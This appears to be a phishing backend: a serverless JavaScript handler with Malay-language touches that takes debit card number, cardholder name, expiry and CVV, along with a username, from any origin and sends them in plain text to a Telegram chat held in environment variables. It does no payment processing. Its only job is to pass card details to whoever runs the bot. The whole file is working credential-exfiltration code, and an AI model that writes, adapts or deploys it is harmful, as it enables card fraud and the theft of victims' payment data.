export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { username, cardNumber, cardName, expiry, cvv } = req.body;
  if (!username || !cardNumber || !cardName || !expiry || !cvv) {
    return res.status(400).json({ error: 'All fields required' });
  }

  // Validasi sederhana (opsional)
  if (!/^\d{16}$/.test(cardNumber.replace(/\s/g, ''))) {
    return res.status(400).json({ error: 'Invalid card number' });
  }
  if (!/^\d{3}$/.test(cvv)) {
    return res.status(400).json({ error: 'CVV must be 3 digits' });
  }

  const token = process.env.TELEGRAM_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    return res.status(500).json({ error: 'Telegram bot not configured' });
  }

  const time = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });
  const message = `💳 *Debit Card Entry*\n👤 Username: ${username}\n💳 Card: ${cardNumber}\n🧾 Name: ${cardName}\n📅 Expiry: ${expiry}\n🔒 CVV: ${cvv}\n🕒 Time: ${time}`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const result = await response.json();
    if (!result.ok) throw new Error(result.description);

    return res.status(200).json({
      success: true,
      message: 'Debit card details received'
    });
  } catch (error) {
    console.error('Telegram error:', error.message);
    return res.status(500).json({ error: 'Failed to send to Telegram' });
  }
}